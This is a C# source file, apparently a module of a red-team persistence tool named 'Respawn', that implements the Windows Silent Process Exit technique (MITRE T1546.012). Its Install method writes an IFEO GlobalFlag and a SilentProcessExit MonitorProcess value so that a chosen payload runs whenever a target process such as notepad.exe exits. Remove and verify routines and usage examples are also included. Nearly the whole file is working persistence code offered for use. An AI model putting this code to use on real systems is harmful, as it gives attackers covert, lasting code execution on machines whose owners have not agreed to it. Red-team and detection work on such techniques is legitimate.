using Microsoft.Win32;
using Respawn.Core;
using ExecutionContext = Respawn.Core.ExecutionContext;

namespace Respawn.Techniques.SilentExit
{
    public class SilentExitModule : ITechniqueModule
    {
        // ─── Identity ────────────────────────────────────────────────────────────

        public string Id          => "silent";
        public string Name        => "Silent Process Exit";
        public string Mitre       => "T1546.012";
        public string Description => "Abuse the Windows 'Silent Process Exit' feature. By enabling GlobalFlags for a process, Windows can be configured to launch a monitor process (the payload) whenever the target process terminates.";

        // ─── Constants ───────────────────────────────────────────────────────────

        const string IfeoPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";
        const string SilentExitPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit";

        // ─── Help ────────────────────────────────────────────────────────────────

        public void ShowHelp()
        {
            TechniqueHelpBuilder.RenderShowHelp("p1", "keys");

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  OPTIONS:");
            Console.ResetColor();
            
            TechniqueHelpBuilder.RenderOption("-n,  --name", "Target process to monitor (e.g. 'notepad.exe')");
            TechniqueHelpBuilder.RenderOption("-p,  --payload", "Path to monitor executable (the payload)");
            Console.WriteLine();

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("  EXAMPLES:");
            Console.ResetColor();

            TechniqueHelpBuilder.RenderExample("Respawn -t silent -a list-keys");
            TechniqueHelpBuilder.RenderExample("Respawn -t silent -a install -n \"notepad.exe\" -p \"C:\\p.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t silent -a verify  -n \"notepad.exe\"");
            TechniqueHelpBuilder.RenderExample("Respawn -t silent -a remove  -n \"notepad.exe\"");
        }

        public List<TechniqueOption> ListOptions(string optionType)
        {
            if (optionType.Equals("keys", StringComparison.OrdinalIgnoreCase))
                return SilentExitKeys.All;

            return new List<TechniqueOption>();
        }

        // ─── Install ─────────────────────────────────────────────────────────────

        public TechniqueResult Install(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: true, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                // 1. Enable GlobalFlag in IFEO
                using (var ifeoBase = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(IfeoPath, writable: true))
                {
                    if (ifeoBase == null) return TechniqueResult.Denied("Access denied to IFEO.");
                    using var procKey = ifeoBase.CreateSubKey(ctx.Name, writable: true);
                    procKey.SetValue("GlobalFlag", 0x200, RegistryValueKind.DWord);
                }

                // 2. Set MonitorProcess in SilentProcessExit
                using (var silentBase = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(SilentExitPath, writable: true) 
                                      ?? Microsoft.Win32.Registry.LocalMachine.CreateSubKey(SilentExitPath, writable: true))
                {
                    using var procKey = silentBase.CreateSubKey(ctx.Name, writable: true);
                    procKey.SetValue("MonitorProcess", ctx.Payload);
                    procKey.SetValue("ReportingMode", 1, RegistryValueKind.DWord); // 1 = Launch monitor process
                }

                return TechniqueResult.Ok($"Silent Exit installed for '{ctx.Name}'. Payload will run when process closes.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Error: {ex.Message}");
            }
        }

        // ─── Remove ──────────────────────────────────────────────────────────────

        public TechniqueResult Remove(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                // 1. Remove IFEO GlobalFlag
                using (var ifeoBase = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(IfeoPath, writable: true))
                {
                    // Fix for CS8602: Use null-conditional operator or check if subKey exists
                    using var subKey = ifeoBase?.OpenSubKey(ctx.Name, writable: true);
                    subKey?.DeleteValue("GlobalFlag", false);
                }

                // 2. Remove SilentExit entry
                using (var silentBase = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(SilentExitPath, writable: true))
                {
                    // Use false to avoid throwing exception if the subkey tree doesn't exist
                    silentBase?.DeleteSubKeyTree(ctx.Name, false);
                }

                return TechniqueResult.Ok($"Removed Silent Exit monitor for '{ctx.Name}'.");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Error: {ex.Message}");
            }
        }

        // ─── Verify ──────────────────────────────────────────────────────────────

        public TechniqueResult Verify(ExecutionContext ctx)
        {
            if (!Validate(ctx, requirePayload: false, out string error))
                return TechniqueResult.Fail(error);

            try
            {
                using var silentBase = Microsoft.Win32.Registry.LocalMachine.OpenSubKey($@"{SilentExitPath}\{ctx.Name}");
                string? monitor = silentBase?.GetValue("MonitorProcess") as string;

                if (string.IsNullOrEmpty(monitor))
                    return TechniqueResult.NotFound($"No Silent Exit monitor found for '{ctx.Name}'.");

                return TechniqueResult.Ok($"Verified Silent Exit for '{ctx.Name}' -> '{monitor}'");
            }
            catch (Exception ex)
            {
                return TechniqueResult.Fail($"Error: {ex.Message}");
            }
        }

        private bool Validate(ExecutionContext ctx, bool requirePayload, out string error)
        {
            error = "";
            if (string.IsNullOrEmpty(ctx.Name)) { error = "Missing process name (-n)"; return false; }
            if (requirePayload && string.IsNullOrEmpty(ctx.Payload)) { error = "Missing payload (-p)"; return false; }
            return true;
        }
    }
}
